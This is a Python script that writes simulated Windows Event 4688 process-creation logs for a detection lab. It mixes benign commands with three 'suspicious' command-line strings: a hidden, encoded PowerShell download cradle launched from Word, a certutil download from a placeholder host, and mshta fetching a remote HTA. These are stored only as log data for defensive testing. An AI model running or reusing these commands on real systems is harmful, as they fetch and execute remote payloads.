#!/usr/bin/env python3
"""Generate simulated Windows Event ID 4688 process creation logs."""

from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path


REPO_ROOT = Path(__file__).resolve().parents[1]
OUTPUT_FILE = REPO_ROOT / "sample_logs" / "generated_windows_event_4688.json"


USERS = ["lab-user", "admin-user", "analyst-user", "svc-deploy"]
HOSTS = ["LAB-WIN10-01", "LAB-WIN10-02", "LAB-SRV-01", "LAB-WIN11-01"]

NORMAL_COMMANDS = [
    {
        "process_name": "cmd.exe",
        "process_path": "C:\\Windows\\System32\\cmd.exe",
        "command_line": "cmd.exe /c whoami",
        "parent_process_name": "explorer.exe",
        "parent_process_path": "C:\\Windows\\explorer.exe",
    },
    {
        "process_name": "powershell.exe",
        "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": "powershell.exe -NoProfile Get-Service",
        "parent_process_name": "explorer.exe",
        "parent_process_path": "C:\\Windows\\explorer.exe",
    },
    {
        "process_name": "ipconfig.exe",
        "process_path": "C:\\Windows\\System32\\ipconfig.exe",
        "command_line": "ipconfig.exe /all",
        "parent_process_name": "cmd.exe",
        "parent_process_path": "C:\\Windows\\System32\\cmd.exe",
    },
]

SUSPICIOUS_COMMANDS = [
    {
        "process_name": "powershell.exe",
        "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": (
            "powershell.exe -NoP -W Hidden -Enc "
            "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAp"
        ),
        "parent_process_name": "winword.exe",
        "parent_process_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    },
    {
        "process_name": "certutil.exe",
        "process_path": "C:\\Windows\\System32\\certutil.exe",
        "command_line": "certutil.exe -urlcache -split -f https://example-payload.test/file.dat file.dat",
        "parent_process_name": "cmd.exe",
        "parent_process_path": "C:\\Windows\\System32\\cmd.exe",
    },
    {
        "process_name": "mshta.exe",
        "process_path": "C:\\Windows\\System32\\mshta.exe",
        "command_line": "mshta.exe https://example-script.test/update.hta",
        "parent_process_name": "outlook.exe",
        "parent_process_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    },
]


def random_timestamp(start: datetime, minutes: int) -> str:
    """Return an ISO 8601 timestamp within a window from the start time."""
    offset = timedelta(minutes=random.randint(0, minutes), seconds=random.randint(0, 59))
    return (start + offset).isoformat().replace("+00:00", "Z")


def build_event(template: dict[str, str], timestamp: str) -> dict[str, object]:
    """Create one simulated Event ID 4688 record."""
    process_id = random.randint(1000, 9000)
    parent_process_id = random.randint(500, 8999)

    return {
        "timestamp": timestamp,
        "host": random.choice(HOSTS),
        "event_id": 4688,
        "event_name": "Process Creation",
        "user": random.choice(USERS),
        "domain": "LAB",
        "process_id": process_id,
        "process_name": template["process_name"],
        "process_path": template["process_path"],
        "command_line": template["command_line"],
        "parent_process_id": parent_process_id,
        "parent_process_name": template["parent_process_name"],
        "parent_process_path": template["parent_process_path"],
        "parent_command_line": template["parent_process_path"],
        "integrity_level": random.choice(["Medium", "High"]),
        "log_source": "simulated",
    }


def generate_events(count: int = 10) -> list[dict[str, object]]:
    """Generate a mix of normal and suspicious process creation events."""
    start = datetime.now(timezone.utc) - timedelta(hours=2)
    events = []

    for _ in range(count):
        command_pool = SUSPICIOUS_COMMANDS if random.random() < 0.3 else NORMAL_COMMANDS
        template = random.choice(command_pool)
        timestamp = random_timestamp(start, minutes=120)
        events.append(build_event(template, timestamp))

    return sorted(events, key=lambda event: str(event["timestamp"]))


def main() -> None:
    """Generate logs and write them to the sample_logs directory."""
    OUTPUT_FILE.parent.mkdir(parents=True, exist_ok=True)
    events = generate_events()

    with OUTPUT_FILE.open("w", encoding="utf-8") as output:
        json.dump(events, output, indent=2)
        output.write("\n")

    print(f"Wrote {len(events)} simulated events to {OUTPUT_FILE}")


if __name__ == "__main__":
    main()
